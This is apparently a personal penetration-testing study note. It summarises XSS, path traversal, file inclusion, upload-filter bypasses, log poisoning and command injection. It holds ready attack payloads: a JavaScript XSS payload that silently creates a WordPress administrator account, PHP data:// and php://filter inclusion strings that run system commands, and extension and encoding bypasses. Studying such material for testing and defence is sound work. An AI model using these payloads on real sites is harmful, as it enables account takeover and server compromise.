## XSS
Cross-Site Scripting is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.
- **Stored (Persistent):** the exploit payload is stored in a database or otherwise cached by a server, so every visitor retrieves that payload and executes it
- **Reflected:** the payload is included in a crafted request or link, only attacking the client that submitted this request
- **DOM-based:** the payload never reach the server, being entirely received and executed by the client

### Notes
- executed in the client-side
- persistent is stored in server-side
- both persistent and reflected originates from a servers input that was not sanitized, but DOM is purely client-side
- web
- can be used to steal cookies, tokens and other session information, besides sensitive data

```js
let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
```

## Path Traversal
Abusing file inclusion set in the request to perform arbitrary read
- change the char encoding, as by replacing the `.` with `%2e`

### Notes
- executed in server-side
- web
- used to perform arbitrary read
- typically occurs when a web application is not sanitizing user input
- bypass filters by encoding the payload

## File Inclusion
Similar to the path traversal, but it allows for the inclusion of file a in the application execution

### Local File Inclusion
Allows for the inclusion of a file local to the server. PHP Wrappers:
- `php://filter`: displays the content of files, with or without encodings
	- `php://filter/resource=_PATH_`
	- `php://filter/convert.base64-encode/resource=_PATH_`
- `data://`: embed data elements as plaintext or base64-encoded data in the running web application's code (requires `allow_url_include` to be enabled)
	- `data://text/plain,<?php%20system("id");?>`
	- `data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+`

### Remote File Inclusion
allow us to include files from a remote system over [[HTTP]] or [[SMB]] (requires `allow_url_include` to be enabled)

### Notes
- executed in server-side
- web
- used to execute arbitrary code
- typically occurs when a web application is not sanitizing user input
- Severity increased when used in conjunction with file upload or log poisoning

## File Upload
Process of exploiting and leveraging existing file upload capabilities

### Server Executed File
The first category consists of vulnerabilities enabling us to upload files that are executable by the web application
- altering the file extension to a less common one, as from `.php` to `.php7` or `.phtml`
- altering the file extension case to bypass case-sensitive string checks, as from `.php` to `.pHp`

### Common Upload
The second category consists of vulnerabilities that require us to combine the file upload mechanism with another vulnerability, such as Directory Traversal, XXE, XSS, or overwriting files
- always test what happens when we try to upload the same file twice
- if it is possible to know if a file uploaded already exists, it might be possible to brute force the contents of the web server

### Malicious File
The third category relies on user interaction, uploading a `.docx` with malicious macros integrated

### Notes
- executed in server-side
- web
- used to include files in the web server
- typically occurs when a web application is not sanitizing the file input
- easy to bypass when based on blacklisting

## Log Poisoning
Injection of payloads into specific fields for inclusion into the logging and metric systems
- `/var/log/apache2/access.log`

### Notes
- executed in server-side
- web?
- used to potentiate [LFI]{Local File Inclusion}

## OS Command Injection
Exploiting inputs that execute os commands
- oneliner to identify if it's the CMD or PowerShell:

### Notes
- typically occurs when a web application is not sanitizing the input

## Notes

```powershell
# Identify if it is CMD or PowerShell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
